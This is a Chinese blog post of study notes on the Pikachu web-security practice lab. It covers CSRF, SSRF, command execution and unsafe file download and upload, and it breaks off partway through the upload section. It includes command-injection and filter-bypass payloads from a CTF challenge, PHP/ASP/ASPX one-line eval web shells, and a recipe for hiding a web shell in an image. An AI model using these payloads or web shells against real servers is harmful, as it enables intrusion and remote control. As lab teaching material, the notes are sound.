@@ -1,0 +1,421 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pikachu笔记(部分) | 为了即将到来的那一刻(那一天)</title><meta name="keywords" content="Web安全"><meta name="author" content="Nik41d0"><meta name="copyright" content="Nik41d0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CSRF​	介绍：跨站请求伪造(Cross-site request forgery，缩写为 CSRF 或 XSRF)，与 XSS 不同，XSS 利用站点内的信任用户，CSRF 则伪装成 受信任用户 请求 受信任的网站。 ​	原理：攻击者利用 目标用户 的身份，以 目标用户 的名义执行某些非法操作，包括：买东西、转账等会泄露个人隐私并威胁到目标用户的安全 GET： ​	几乎所有参数都是通过 GET">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu笔记(部分)">
+<meta property="og:url" content="http://example.com/2022/10/13/101%E2%80%94pikachu/index.html">
+<meta property="og:site_name" content="为了即将到来的那一刻(那一天)">
+<meta property="og:description" content="CSRF​	介绍：跨站请求伪造(Cross-site request forgery，缩写为 CSRF 或 XSRF)，与 XSS 不同，XSS 利用站点内的信任用户，CSRF 则伪装成 受信任用户 请求 受信任的网站。 ​	原理：攻击者利用 目标用户 的身份，以 目标用户 的名义执行某些非法操作，包括：买东西、转账等会泄露个人隐私并威胁到目标用户的安全 GET： ​	几乎所有参数都是通过 GET">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/005.jpg">
+<meta property="article:published_time" content="2022-10-13T05:18:30.000Z">
+<meta property="article:modified_time" content="2023-02-17T14:00:41.275Z">
+<meta property="article:author" content="Nik41d0">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/005.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/10/13/101%E2%80%94pikachu/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/Nik41d0" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '宣告！你的剪切板已被吾占领',
+    error: '哎呀，讨厌啦~~~',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu笔记(部分)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-17 22:00:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/005.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">为了即将到来的那一刻(那一天)</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pikachu笔记(部分)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-13T05:18:30.000Z" title="发表于 2022-10-13 13:18:30">2022-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-17T14:00:41.275Z" title="更新于 2023-02-17 22:00:41">2023-02-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%94%BB%E4%BD%93/">锻体</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pikachu笔记(部分)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>​	介绍：跨站请求伪造(Cross-site request forgery，缩写为 CSRF 或 XSRF)，与 XSS 不同，XSS 利用站点内的信任用户，CSRF 则伪装成 受信任用户 请求 受信任的网站。</p>
+<p>​	<strong>原理</strong>：攻击者利用 目标用户 的身份，以 目标用户 的名义执行某些非法操作，包括：买东西、转账等会泄露个人隐私并威胁到目标用户的安全</p>
+<p><strong>GET：</strong></p>
+<p>​	几乎所有参数都是通过 GET方式进行请求的，包括用户名、密码和一些个人信息。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-01.jpg"></p>
+<p>​	登录账号后，我们可以通过修改 GET请求 中的值来修改个人信息，达到与图形化界面得到相同结果（可惜没多大用）<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-02.jpg"></p>
+<p><strong>POST：</strong></p>
+<p>​	登陆账号后修改信息，抓包发现个人信息都在报文中，这时我们无法对 URL 进行修改。我们可以自己创建一份报文，让登录 kobe 的用户点击，用户点击后，个人信息就被修改了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-03.jpg"></p>
+<ul>
+<li>BP中有个构造 CSRF PoC功能(Engagement tools中，社区版不能用)，它会生成一段 HTML 代码，此代码是 CSRF漏洞的测试代码。</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-04.jpg"></p>
+<ul>
+<li>复制后，发布到网站中，用户访问后，点击submit按钮后，信息修改成功（不过，这能骗到人吗？至少样子先得做得和真网站 一样吧，虽然我也不知道）</li>
+</ul>
+<p><strong>防御方法</strong></p>
+<ul>
+<li><p>验证请求报文中的 Referer 值，若 Referer值是以自己网站开头的域名，说明该请求来自网站自身，是合法的；若值是空或者其他网站域名，则有可能是 CSRF攻击，那么服务器拒绝该请求。（但是能被绕过）</p>
+</li>
+<li><p>攻击之所以可以成功，是 攻击者 伪造了 用户请求，所以我们可以在请求中放入 攻击者 无法伪造的信息，在 HTTP 请求中加入一个随机产生的token，并在 服务端 验证，如果请求报文中 无token 或token 值错误，则可以视为CRSF攻击而拒绝</p>
+</li>
+</ul>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>​	介绍：服务器端请求伪造(Server-side request forgery)，一种由 攻击者 构造请求，服务器端 发起请求的漏洞。SSRF攻击的目标是 外网无法访问的 内部系统（因为请求是由 请求端 发起的，所以 服务器端 只能请求到与自身相连而与外网隔离的内部系统）</p>
+<p>​	<strong>原理</strong>：服务端 提供了 从其他服务器获取数据的功能 且 没有对目标地址进行过滤与限制。比如：攻击者 操作服务端从指定的 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。</p>
+<blockquote>
+<p>PHP 中这些函数使用不当会引起 SSRF：file_get_contents() 、fsockopen() 、curl_exec() </p>
+<p>curl_exec()函数：执行一个 curl 会话(模拟浏览器请求)</p>
+</blockquote>
+<p>​	点击超链接后，可以看到其是通过 curl_exec()函数对 GET传参得到 url建立一个 会话(看源码也可以)，因为没进行过滤，所以 url中输入什么都可以(输入baidu.com就会跳转的 百度 的页面)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-01.jpg"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$CH</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$URL</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>， CURLOPT_HEADER， <span class="literal">FALSE</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>， CURLOPT_SSL_VERIFYPEER， <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$RES</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$CH</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$CH</span>) ;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>比如我们可以访问文本内容</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-02.png"></p>
+<ul>
+<li>还可以查看其开放的端口，未开放的话就无显示</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-03.png"></p>
+<ul>
+<li>第二关 file_get_contents 和上一关没太大区别，就不说了</li>
+</ul>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>​	介绍：remote command&#x2F;code execute，能使 攻击者 直接向 后台服务器 远程注入 操作系统的命令 或 代码，从而远程控制后台系统</p>
+<p><strong>原理</strong></p>
+<p><strong>远程系统命令执行</strong>：</p>
+<ul>
+<li>应用系统 从设计上需要给用户提供 指定的远程命令操作的接口。比如我们常见的路由器、防火墙等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果 设计者 在完成该功能时，没有做严格的安全控制，则可能会导致 攻击者 通过该接口提交其他的命令，让后台执行后从而 控制整个后台服务器</li>
+</ul>
+<p><strong>远程代码执行</strong>：</p>
+<ul>
+<li>后台有时候也会把用户的输入作为代码的一部分执行，也就造成了 远程代码执行漏洞。 不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。</li>
+</ul>
+<p><strong>系统命令拼接</strong></p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cmd A <strong>;</strong> cmd B</td>
+<td>先运行命令A，在运行命令B(二者之间无逻辑联系)</td>
+</tr>
+<tr>
+<td>cmd A <strong>&amp;</strong> cmd B</td>
+<td>先后运行命令 A、B</td>
+</tr>
+<tr>
+<td>cmd A <strong>&amp;&amp;</strong> cmd B</td>
+<td>命令 A <strong>成功</strong> 运行后，运行 B (不成功则不运行)</td>
+</tr>
+<tr>
+<td>cmd A <strong>|</strong> cmd B</td>
+<td>A的输出 作为B的输入</td>
+</tr>
+<tr>
+<td>cmd A <strong>||</strong> cmd B</td>
+<td>运行命令 A，成功则不运行 B (失败则运行B)</td>
+</tr>
+</tbody></table>
+<p>​	如果这些 运算符 被过滤了，可以用 %0a(换行符)、%0d(回车符) 来代替</p>
+<p><strong>系统命令执行函数</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() <span class="title function_ invoke__">passthru</span>() <span class="title function_ invoke__">exec</span>() <span class="title function_ invoke__">shell_exec</span>() <span class="title function_ invoke__">popen</span>() <span class="title function_ invoke__">proc_open</span>() <span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">    exec shell_exec 函数默认无回显，需要手动输出</span><br><span class="line">    <span class="title function_ invoke__">pcntl_exec</span>():Linux下的扩展，需要安装</span><br><span class="line">	通过URL输入命令时要加上【;】 比如 /?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>空格过滤绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$IFS$1   //$1改成$加其他数字也行，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line">$IFS	如果单纯的cat$IFS, bash解释器会把整个IFS当做变量名，输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">&lt; &lt;&gt;重定向符替换</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09 (tab)</span><br></pre></td></tr></table></figure>
+
+<p><strong>cat过滤绕过</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca<span class="string">&#x27;&#x27;</span>t、ca<span class="string">&quot;&quot;</span>t、ca\t 也能绕过</span></span><br><span class="line">tac			#从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more		# 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less		# 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head		# 只显示头几行</span><br><span class="line">tail		# 只显示最后几行</span><br><span class="line">nl			#类似于cat -n，显示时输出行号</span><br><span class="line">tailf		#类似于tail -f</span><br><span class="line">sort		#打印以字母序列进行文本排序</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag 过滤绕过</strong></p>
+<ul>
+<li><p>禁用flag时，可以用 <code>fl\ag、fl&quot;&quot;ag、fl&#39;&#39;ag</code> 绕过</p>
+</li>
+<li><p>也可以用 通配符 ? * 来代替 flag，比如 <code>fl* 、 *ag</code> 等等</p>
+</li>
+<li><p>$@ 和 $N(N为数字0-9)：<code>fl$@ag、fl$1ag、fl$9ag</code> 等等</p>
+<ul>
+<li>$n代表shell的位置参数，$0：代表命令本身，$1-9：代表第1-9个参数</li>
+</ul>
+</li>
+</ul>
+<p><strong>ls 过滤绕过</strong></p>
+<ul>
+<li>禁用 ls 时，可以用 <code>l\s</code> 绕过</li>
+<li>也可以用 <code>dir</code> 代替<del>(之前还以为这是Windows的命令，linux也有啊)</del></li>
+</ul>
+<p><strong>[GXYCTF2019]Ping Ping Ping</strong>：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/RCE-01.jpg"></p>
+<p>​	几乎过滤了所有的符号；flag贪婪匹配，匹配一个字符串中，是否按顺序出现过 f l a g 四个字母</p>
+<p>解决方法：</p>
+<ol>
+<li><p>内联执行：将 反引号内 命令的 输出 作为 输入 执行(反引号：ESC键下面那个)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>源码中有一个变量 $a，可以用其覆盖而拼接flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">	变量 ab 互换传递，实现拼接</span><br><span class="line">/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span class="line">/?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$1$b.php</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="Unsafe-file-download"><a href="#Unsafe-file-download" class="headerlink" title="Unsafe file download"></a>Unsafe file download</h1><ul>
+<li>当我们点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称</li>
+<li>后台在收到请求后会开始执行下载代码，将该文件名对应的文件 响应 给浏览器，从而完成下载</li>
+</ul>
+<blockquote>
+<p>​	如果后台在收到请求的文件名后，将其直接拼接进 下载文件的路径 中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞</p>
+<p>​	若 攻击者 提交的是一个精心构造的路径，则很有可能会直接将该指定的文件下载下来， 从而导致后台敏感信息(密码文件、源代码等)被下载</p>
+</blockquote>
+<p>​	随便点击一张图片后抓包，发现这是通过 GET请求返回 所要下载的文件，既然如此那么就可以修改它的值，来下载其他的文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/filedown-01.png" alt="filedown-01"></p>
+<p>​	我们可以通过 BP中 <code>Target</code> 下的 <code>site map</code> 看到 其大概的 文件树结构，想要下载其他文件的话修改文件路径即可(啊，不过要先 ..&#x2F;切出 当前所在的文件夹哟)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/filedown-02.jpg" alt="filedown-02"></p>
+<h1 id="Unsafe-file-upload-文件上传"><a href="#Unsafe-file-upload-文件上传" class="headerlink" title="Unsafe file upload(文件上传)"></a>Unsafe file upload(文件上传)</h1><p>​	大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在进程服务器上执行任意PHP脚本</p>
+<p>特殊后缀名绕过： <code>.phtml</code>、<code>.pht</code> 、<code>.php5</code>、<code>.php4</code>、<code>.php3</code>、<code>.php2</code> (<code>.php</code> 后缀若被过滤可以试试)</p>
+<p><strong>一句话木马</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:	&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">若上面的被过滤:	&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt;</span><br><span class="line">asp:	&lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx:	&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>eval()函数：把一段字符串当作PHP语句来执行(当然该字符串必须是合法的PHP语句)</p>
+</li>
+<li><p>@：忽略该语句中可能产生的错误消息(错误控制操作符)</p>
+</li>
+</ul>
+<p>​	AntSword连接一句话原理：通过 POST 方式将我们想要执行操作的 代码(经过了URL编码) 传入到超级全局变量(也就是所谓连接密码)中，然后通过 eval()执行</p>
+<p>​	可以用BP抓包，先设置好 蚁剑 的代理，设置好后，就可以用BP抓包了，以下是查看文件时抓的包，可以看到就是发送一段代码来代替了字符串pass，也可以说是用 POST的方式对pass(设置的连接密码)重新进行赋值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-01.jpg"></p>
+<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a><strong>图片马</strong></h2><blockquote>
+<p>前提：含有文件包含漏洞</p>
+</blockquote>
+<ul>
+<li><p>通过使用 getimagesize()函数获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE</p>
+<p>​	制作图片马的命令如下</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b + <span class="number">1</span>.php/a shell.png</span><br><span class="line">	# /A： 表示一个 ASCII 文本文件 /b：表示一个二进位文件(<span class="built_in">copy</span>参数)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>也有的是用 exif_imagetype() 函数只检查该文件十六进制的前几个字节，直接在 文件开头 添加 相应图片的文件头即可绕过</p>
+<ul>
+<li>可以用记事本打开该文件，直接在开头添加 图片文件头 的ASCII码</li>
+<li>也可以 用十六进制的形式 添加图片文件头</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF：47 49 46 38 39 61(HEX)		GIF89a 或者GIF87a(ASCII)</span><br><span class="line">BMP：42 4D(HEX)		BM(ASCII)</span><br><span class="line">JPG：FF D8</span><br><span class="line">PNG：89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">剩下的两个转换成ASCII后都有不可打印字符(好像是)，无法直接将ASCII码添加到文本中</span><br></pre></td></tr></table></figure>
+
+<h2 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h2><h3 id="png上传-IDAT"><a href="#png上传-IDAT" class="headerlink" title="png上传(IDAT)"></a>png上传(IDAT)</h3><p>​	 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并显示出来</p>
+<blockquote>
+<p>png图片由 3个以上 的数据块组成<br>其有两种类型的数据块，一种是关键数据块（标准数据块），另一种是辅助数据块（可选的数据块）<br>关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们</p>
+</blockquote>
+<ul>
+<li><p>数据块IHDR：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，一个PNG数据流中只能有一个文件头数据块</p>
+</li>
+<li><p>图像数据块IDAT：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，IDAT存放着图像真正的数据信息</p>
+</li>
+<li><p>图像结束数据IEND：用来标记PNG文件或者数据流已经结束，必须要放在文件的尾部。文件结尾12个字节一般是：00 00 00 00 49 45 4E 44 AE 42 60 82</p>
+</li>
+</ul>
+<p>​	使用php脚本写入IDAT数据块（国外大佬写的脚本，直接运行即可，<del>哎，我连个脚本都不会写</del>）</p>
